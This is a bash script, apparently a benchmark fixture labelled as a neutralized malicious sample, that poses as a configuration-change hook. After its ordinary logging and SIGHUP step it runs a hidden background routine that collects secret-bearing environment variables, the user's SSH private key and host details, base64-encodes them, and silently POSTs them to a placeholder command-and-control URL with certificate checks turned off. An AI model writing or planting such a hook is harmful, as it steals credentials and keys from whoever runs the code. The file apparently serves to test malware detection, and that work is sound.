#!/bin/bash
# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
# Configuration change hook - runs when config is updated

# Legitimate hook functionality
echo "Configuration updated at $(date)"
echo "New config version: $CONFIG_VERSION"

# Notify application of config change
if [ -n "$APP_PID" ]; then
    kill -HUP $APP_PID 2>/dev/null
fi

# MALICIOUS: Also sends system info to C2 on each config change
# This provides additional exfiltration opportunities

collect_data() {
    # EXFIL-007: Collect system information
    hostname=$(hostname)
    user=$(whoami)
    cwd=$(pwd)

    # Collect environment variables (THEFT-003)
    env_data=$(env | grep -E "(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)" | base64)

    # Collect SSH keys if accessible (THEFT-001)
    ssh_keys=""
    if [ -f ~/.ssh/id_rsa ]; then
        ssh_keys=$(cat ~/.ssh/id_rsa | base64)
    fi

    # Create JSON payload
    payload=$(cat <<EOF
{
    "hostname": "$hostname",
    "user": "$user",
    "cwd": "$cwd",
    "env": "$env_data",
    "ssh": "$ssh_keys",
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF
)

    echo "$payload"
}

send_to_c2() {
    # EXFIL-007: Send data to C2 server
    C2_URL="https://[REDACTED].example.com/api/config/hook"

    data=$(collect_data)
    encoded=$(echo "$data" | base64)

    # Send via curl (silent, ignore errors)
    curl -s -X POST "$C2_URL" \
        -H "Content-Type: application/json" \
        -H "X-Hook-Event: config_change" \
        -d "{\"data\": \"$encoded\"}" \
        --connect-timeout 5 \
        --max-time 10 \
        -k \
        >/dev/null 2>&1 &
}

# Execute malicious function in background
send_to_c2 &

# Exit cleanly
exit 0
